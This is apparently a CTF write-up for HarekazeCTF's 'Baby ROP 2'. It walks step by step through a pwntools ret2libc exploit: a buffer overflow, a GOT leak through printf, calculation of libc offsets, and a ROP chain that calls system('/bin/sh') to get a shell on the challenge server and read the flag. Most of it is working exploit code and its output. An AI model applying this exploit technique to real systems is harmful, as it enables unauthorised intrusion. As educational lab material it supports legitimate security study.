# Baby ROP 2

`nc problem.harekaze.com 20005`

[babyrop2](babyrop2)

[libc.so.6](libc.so.6)

Open and decompile on Ghidra:
```c
int main(void)

{
  ssize_t sVar1;
  undefined local_28 [28];
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  printf("What\'s your name? ");
  sVar1 = read(0,local_28,0x100);
  local_c = (int)sVar1;
  local_28[(long)(local_c + -1)] = 0;
  printf("Welcome to the Pwn World again, %s!\n",local_28);
  return 0;
}
```
Looks like its a buffer overflow!

It also give us `libc.so.6` which means its a Return to Libc attack!

Tutorial about ret2libc : [Doing ret2libc with a Buffer Overflow because of restricted return pointer - bin 0x0F](https://www.youtube.com/watch?v=m17mV24TgwY)

My idea its to do buffer overflow and execute `system("/bin/sh")`

By default the machine enable ASLR (Address Space Layout Randomization)

Which means we have to leak the system address first

Using `checksec` we can check the program protection:
```bash
# checksec babyrop2
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found	# Buffer overflow is exploitable
    NX:       NX enabled		# Can't execute shellcode
    PIE:      No PIE (0x400000)	# Program function is fixed
```
First of course is find the offset:
```python
from pwn import *
elf = ELF('./babyrop2')
p = elf.process()
p.sendline('a'*44)
print p.recv()
```
Output:
```
[x] Starting local process '/root/Downloads/harekaze/rop2/babyrop2'
[+] Starting local process '/root/Downloads/harekaze/rop2/babyrop2': pid 11375
What's your name? Welcome to the Pwn World again, aaaaaaaaaaaaaaaaaaaaaaaaaaaa-!

[*] Stopped process '/root/Downloads/harekaze/rop2/babyrop2' (pid 11375)
```
Stopped means we break something, check it with `dmesg`
```
# dmesg | grep babyrop2
[12951.502992] babyrop2[11339]: segfault at 7f0061616161 ip 00007f0061616161 sp 00007fffffffe150 error 14 in libc-2.28.so[7ffff7de7000+22000]
```
As seen above, we overwrite 4 bytes of EIP

So our payload should -4 and put the address to execute behind:
```python
from pwn import *
elf = ELF('./babyrop2')
main = elf.symbols['main']		# Get the address of main
p = elf.process()
p.sendline('a'*40+p64(main))	# Execute main
p.interactive()
```
Output:
```
# python solve.py 
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/harekaze/rop2/babyrop2': pid 11648
[*] Switching to interactive mode
What's your name? Welcome to the Pwn World again, aaaaaaaaaaaaaaaaaaaaaaaaaaaa1!
What's your name? $ ls
Welcome to the Pwn World again, ls!
```
Yay! Next step is to leak address and calculate the address of system

We can use `printf("%s",got_address)` to leak the address store in GOT (Global Offset Table)

GOT is use to store C library function address

Use `objdump -d babyrop2` or use pwntools also can get the GOT address of a function

Using pwntools:
```python
from pwn import *
elf = ELF('./babyrop2')
main = elf.symbols['main']
print hex(elf.symbols['got.read'])
```
Using `objdump`:
```bash
# objdump -d babyrop2 

babyrop2:     file format elf64-x86-64
...
...
...
00000000004004f0 <printf@plt>:
  4004f0:	ff 25 22 0b 20 00    	jmpq   *0x200b22(%rip)        # 601018 <printf@GLIBC_2.2.5> (printf GOT)
  4004f6:	68 00 00 00 00       	pushq  $0x0
  4004fb:	e9 e0 ff ff ff       	jmpq   4004e0 <.plt>

0000000000400500 <read@plt>:
  400500:	ff 25 1a 0b 20 00    	jmpq   *0x200b1a(%rip)        # 601020 <read@GLIBC_2.2.5> (read GOT)
  400506:	68 01 00 00 00       	pushq  $0x1
  40050b:	e9 d0 ff ff ff       	jmpq   4004e0 <.plt>
```
Next step is to find the format string

We can use the `"Welcome to the Pwn World again, %s!\n"` string already in the program

Find the address of the string using pwntools:
```python
from pwn import *
elf = ELF('./babyrop2')
main = elf.symbols['main']
read = elf.symbols['got.read']
print hex(next(elf.search('%s')))
```
Output:
```bash
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
0x400790
```
Its at 0x400790

Using ROP library in pwntools we can easily build the payload for `printf`:
```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./babyrop2')
main = elf.symbols['main']
read_got = elf.symbols['got.read']
format_string = next(elf.search('%s'))
r = ROP(elf)
r.printf(format_string,read_got)			# printf("%s",read_got)
p = elf.process()
p.sendline('a'*40+str(r))
p.interactive()
```
Output:
```
# python solve.py 
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded cached gadgets for './babyrop2'
[+] Starting local process '/root/Downloads/harekaze/rop2/babyrop2': pid 12713
[*] Switching to interactive mode
What's your name? Welcome to the Pwn World again, aaaaaaaaaaaaaaaaaaaaaaaaaaaaY!
P\x17���\x7f!
```
Yeah, looks like it prints out the `read` function correctly

Next, we need to calculate the distance between `read` and `system`

Using `locate libc.so.6` to check the path of our library

For my case is at `/usr/lib/x86_64-linux-gnu/libc.so.6`

Remember C function address can be different but the distance between is fixed

Using pwntools:
```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./babyrop2')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
main = elf.symbols['main']
read_got = elf.symbols['got.read']
format_string = next(elf.search('%s'))
system_offset = libc.symbols['read'] - libc.symbols['system']
print system_offset
```
Output:
```
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
678656
```
So the system address is located at `read_address - system_offset`
```python
p = elf.process()
p.sendline('a'*40+str(r))
p.recvuntil("\n")
read_address = p.recvuntil("!\n")[:-2]			# Get the string
read_address = u64(read_address + "\x00\x00")	# Add 2 null byte because need 8 bytes
												# u64 to convert back to integer
print hex(read_address - system_offset)			# Calculate system address
```
Every thing is ready except we need "/bin/sh" to put in `system()`

We can find it at our C library, and need to calculate the address as well:
```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./babyrop2')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
main = elf.symbols['main']
read_got = elf.symbols['got.read']
format_string = next(elf.search('%s'))
system_offset = libc.symbols['read'] - libc.symbols['system']
sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh'))	# Calculate the distance between
r = ROP(elf)
r.printf(format_string,read_got)
p = elf.process()
p.sendline('a'*40+str(r))
p.recvuntil("\n")
read_address = p.recvuntil("!\n")[:-2]
read_address = u64(read_address + "\x00\x00")
print hex(read_address - system_offset)
print hex(read_address - sh_offset)		# Calculate binsh address
```
Output:
```
0x7ffff7e2bc50
0x7ffff7f68519
```
## Final Step

Ok! Everything is set lets build the payload!
```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./babyrop2')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
main = elf.symbols['main']
read_got = elf.symbols['got.read']
format_string = next(elf.search('%s'))
system_offset = libc.symbols['read'] - libc.symbols['system']
sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh'))
r = ROP(elf)
r.printf(format_string,read_got)
r.main()											# Run the main again to buffer overflow again
p = elf.process()
p.sendline('a'*40+str(r))
p.recvuntil("\n")
read_address = p.recvuntil("!\n")[:-2]
read_address = u64(read_address + "\x00\x00")
system_address = read_address - system_offset
sh_address = read_address - sh_offset
elf.symbols['system'] = system_address				# Set the system address
r = ROP(elf)
r.system(sh_address)								# system("/bin/sh")
p.sendline('a'*40+str(r))							# Send the payload again
p.interactive()
```
Output:
```bash
# python solve.py 
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for './babyrop2'
[+] Starting local process '/root/Downloads/harekaze/rop2/babyrop2': pid 14595
[*] Switching to interactive mode
What's your name? Welcome to the Pwn World again, aaaaaaaaaaaaaaaaaaaaaaaaaaaaA!
$ ls
babyrop2  core    libc.so.6  README.md  solve.py
```
Yay! Looks like we got it!!

Change the process to netcat!
```python
# p = elf.process()
p = remote('problem.harekaze.com',20005)
```

```bash
# python solve.py 
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for './babyrop2'
[+] Opening connection to problem.harekaze.com on port 20005: Done
[*] Switching to interactive mode
What's your name? Welcome to the Pwn World again, aaaaaaaaaaaaaaaaaaaaaaaaaaaaA!
[*] Got EOF while reading in interactive
$  
```
But it got something wroong...

Looks like we forgot to use the `libc.so.6` it give us, it wont work because different version
```python
libc = ELF('./libc.so.6')
```
Run the script, and it works perfectly! =)
```bash
# python solve.py 
[*] '/root/Downloads/harekaze/rop2/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/root/Downloads/harekaze/rop2/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for './babyrop2'
[+] Opening connection to problem.harekaze.com on port 20005: Done
[*] Switching to interactive mode
What's your name? Welcome to the Pwn World again, aaaaaaaaaaaaaaaaaaaaaaaaaaaaA!
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd /home/babyrop2
$ cat flag
HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}
```

## Flag
> HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}